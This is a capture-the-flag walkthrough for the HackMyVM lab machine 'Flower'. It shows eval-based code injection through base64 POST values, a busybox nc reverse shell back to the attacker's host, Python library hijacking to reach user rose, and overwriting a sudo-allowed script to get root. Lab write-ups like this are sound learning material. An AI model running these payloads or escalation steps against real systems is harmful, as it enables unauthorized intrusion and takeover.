# Flower

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Flower | alienum | Beginner | HackMyVM |

**Summary:** Flower is a Linux machine that involves web-based reconnaissance leading to Remote Code Execution (RCE) via a PHP `eval()` style vulnerability on a specific parameter. Initial access is gained as `www-data`. Privilege escalation to user `rose` is achieved through Python library hijacking on a sudo-allowed script. Finally, root access is obtained by modifying a shell script that the user `rose` is allowed to execute as root.

---

## Reconnaissance

The initial network scan identifies the target IP address as `192.168.100.115`.

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.115 08:00:27:87:79:99 VirtualBox
```

A full TCP port scan using Nmap reveals port 80 is open, running Apache httpd 2.4.38.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/flower]
└─$ nmap -sC -sV -p- -T4 192.168.100.115
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-18 06:47 WIB
Nmap scan report for 192.168.100.115
Host is up (0.0043s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.38 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.23 seconds
```

Validating the web server response headers:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/flower]
└─$ curl -I http://192.168.100.115
HTTP/1.1 200 OK
Date: Tue, 17 Feb 2026 23:48:40 GMT
Server: Apache/2.4.38 (Debian)
Content-Type: text/html; charset=UTF-8
```

Visiting the website on port 80 presents a "Count Petals" application.

![80](image.png)

## Vulnerability Discovery

Inspecting the HTML source code reveals an interesting implementation for the dropdown menu. The values for the options appear to be base64 encoded strings.

```javascript
<!DOCTYPE html>
<html>
    <head>
    <style>
    html {
      background: url(flower.jpg) no-repeat center center fixed; 
      background-size: cover;
     }
    </style>
    </head>
    <body>
        <h1 style="background-color:pink;">Count Petals</h1>
         <label for="flowers" style="background-color:pink;">Choose a flower to count petals:</label>
         <select name="petals" form="flosub">
            <option name="Lily" value="MSsy">Lily</option>
            <option name="Buttercup" value="Misz">Buttercup</option>
            <option name="Delphiniums" value="Mys1">Delphiniums</option>
            <option name="Cineraria" value="NSs4">Cineraria</option>
            <option name="Chicory" value="OCsxMw==">Chicory</option>
            <option name="Chrysanthemum" value="MTMrMjE=">Chrysanthemum</option>
            <option name="Michaelmas daisies" value="MjErMzQ=">Michaelmas daisies</option>
	 </select> 
        <form action="/" method="post" id="flosub">
         <input type="submit" value="Submit">
        </form>
...
```

Decoding these values confirms they are mathematical expressions:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/flower]
└─$ echo 'MSsy' | base64 -d
1+2                                                             
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/flower]
└─$ echo 'Misz' | base64 -d
2+3                                                             
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/flower]
└─$ echo 'Mys1' | base64 -d
3+5                                                             
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/flower]
└─$ echo 'NSs4' | base64 -d
5+8                                                             
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/flower]
└─$ echo 'OCsxMw==' | base64 -d
8+13                                                            
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/flower]
└─$ echo 'MTMrMjE=' | base64 -d
13+21                                                           
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/flower]
└─$ echo 'MjErMzQ=' | base64 -d
21+34 
```

The server likely decodes the base64 input and evaluates it (e.g., using PHP's `eval()` or similar). This behavior suggests a Code Injection vulnerability if we can pass arbitrary commands.

## Initial Access

To test for Remote Code Execution (RCE), we craft a payload using `system("id")`, base64 encode it, and send it via a POST request to the `petals` parameter.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/flower]
└─$ echo 'system("id")' | base64
c3lzdGVtKCJpZCIpCg==

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/flower]
└─$ curl -X POST http://192.168.100.115/ -d "petals=c3lzdGVtKCJpZCIpCg=="
...
        <h2>

        uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=33(www-data) gid=33(www-data) groups=33(www-data) petals
        </h2>
    </body>
</html>
```

The output confirms code execution. We now generate a reverse shell payload using `busybox nc`.

**Payload Generation:**
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/flower]
└─$ echo 'system("busybox nc 192.168.100.1 4444 -e /bin/bash")' | base64
c3lzdGVtKCJidXN5Ym94IG5jIDE5Mi4xNjguMTAwLjEgNDQ0NCAtZSAvYmluL2Jhc2giKQo=
```

**Listener Setup:**
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/flower]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

**Exploitation:**
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/flower]
└─$ curl -X POST http://192.168.100.115/ -d "petals=c3lzdGVtKCJidXN5Ym94IG5jIDE5Mi4xNjguMTAwLjEgNDQ0NCAtZSAvYmluL2Jhc2giKQo="
```

**Stabilizing the Shell:**
Once connected, we stabilize the shell for a better interactive experience.

```bash
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 58642
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")'
www-data@flower:/var/www/html$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/flower]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

www-data@flower:/var/www/html$ export SHELL=bash
www-data@flower:/var/www/html$ export TERM=xterm
www-data@flower:/var/www/html$ stty rows 100 cols 200
www-data@flower:/var/www/html$ reset
```

## Internal Enumeration

We check for other users on the system and inspect the `/home` directory.

```bash
www-data@flower:/var/www/html$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
rose:x:1000:1000:rose,,,:/home/rose:/bin/bash
www-data@flower:/var/www/html$ ls -la /home/rose/
total 32
drwxrwxr-x 3 rose rose 4096 Nov 30  2020 .
drwxr-xr-x 3 root root 4096 Nov 30  2020 ..
-rw-r--r-- 1 rose rose  220 Nov 30  2020 .bash_logout
-rw-r--r-- 1 rose rose 3526 Nov 30  2020 .bashrc
-rwx------ 1 rose rose  120 Nov 30  2020 .plantbook
-rw-r--r-- 1 rose rose  807 Nov 30  2020 .profile
drwxrwxrwx 2 rose rose 4096 Nov 30  2020 diary
-rw------- 1 rose rose   20 Nov 30  2020 user.txt
```

Searching for files owned by `rose` reveals a `diary` script.

```bash
www-data@flower:/var/www/html$ find / -user "rose" 2>/dev/null
/diary
/home/rose
/home/rose/diary
/home/rose/diary/diary.py
...
```

Checking `sudo` privileges for `www-data`:

```bash
www-data@flower:/var/www/html$ sudo -l
Matching Defaults entries for www-data on flower:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on flower:
    (rose) NOPASSWD: /usr/bin/python3 /home/rose/diary/diary.py
```

The `diary.py` script imports the `pickle` module.

```bash
www-data@flower:/var/www/html$ cat /home/rose/diary/diary.py
import pickle

diary = {"November28":"i found a blue viola","December1":"i lost my blue viola"}
p = open('diary.pickle','wb')
pickle.dump(diary,p)
```

## Privilege Escalation

### User: www-data -> rose

The directory `/home/rose/diary` is writable by everyone (`drwxrwxrwx`). This allows us to perform a Python Library Hijacking attack. Since `diary.py` imports `pickle` and is executed from `/home/rose/diary`, we can create a malicious `pickle.py` in that directory. When `diary.py` is run, it will import our malicious script instead of the standard library module.

```bash
www-data@flower:/var/www/html$ cd /home/rose/diary/
www-data@flower:/home/rose/diary$ echo 'import os; os.system("/bin/bash")' > pickle.py
www-data@flower:/home/rose/diary$ cat pickle.py
import os; os.system("/bin/bash")
```

Executing the script as user `rose`:

```bash
www-data@flower:/home/rose/diary$ sudo -u rose /usr/bin/python3 /home/rose/diary/diary.py
rose@flower:~/diary$ id
uid=1000(rose) gid=1000(rose) groups=1000(rose),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
```

### User: rose -> root

We check `sudo` privileges for the user `rose`.

```bash
rose@flower:~/diary$ sudo -l
Matching Defaults entries for rose on flower:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User rose may run the following commands on flower:
    (root) NOPASSWD: /bin/bash /home/rose/.plantbook
```

The user `rose` can run `/home/rose/.plantbook` as root. We check the permissions and content of this file.

```bash
rose@flower:~$ ls -la /home/rose/.plantbook
-rwx------ 1 rose rose 120 Nov 30  2020 /home/rose/.plantbook
rose@flower:~$ cat .plantbook
#!/bin/bash
echo Hello, write the name of the flower that u found
read flower
echo Nice, $flower submitted on : $(date)
```

The file is owned by `rose` and is writable. We can modify it to spawn a root shell. First, we back up the original file.

```bash
rose@flower:~$ cp /home/rose/.plantbook /home/rose/.plantbook.backup
```

Then we overwrite it with a command to launch `/bin/bash` and execute it with sudo.

```bash
rose@flower:~$ echo "/bin/bash" > /home/rose/.plantbook
rose@flower:~$ sudo /bin/bash /home/rose/.plantbook
root@flower:/home/rose# cd
root@flower:~# id
uid=0(root) gid=0(root) groups=0(root)
```

We have successfully obtained root access and can retrieve the flags.

```bash
root@flower:~# cat /root/root.txt /home/rose/user.txt
HMV{R0s[REDACTED]}
HMV{R0s[REDACTED]}
```

---

## Attack Chain Summary

1.  **Reconnaissance**: Discovered port 80 running Apache. Found a "Count Petals" page that submits data via POST.
2.  **Vulnerability Discovery**: Analyzed source code to find base64 encoded inputs. Identified that the server evaluates decoded base64 strings, leading to Command Injection.
3.  **Exploitation**: Injected `system("busybox nc ...")` payload encoded in base64 to gain a reverse shell as `www-data`.
4.  **Internal Enumeration**: Found `sudo` privileges for `www-data` to run a Python script as user `rose`.
5.  **Privilege Escalation (rose)**: Hijacked the `pickle` Python library by creating a malicious `pickle.py` in the writable script directory, gaining a shell as `rose`.
6.  **Privilege Escalation (root)**: Identified `sudo` privileges for `rose` to run a writable shell script `.plantbook` as root. Modified the script to spawn a bash shell, resulting in root access.
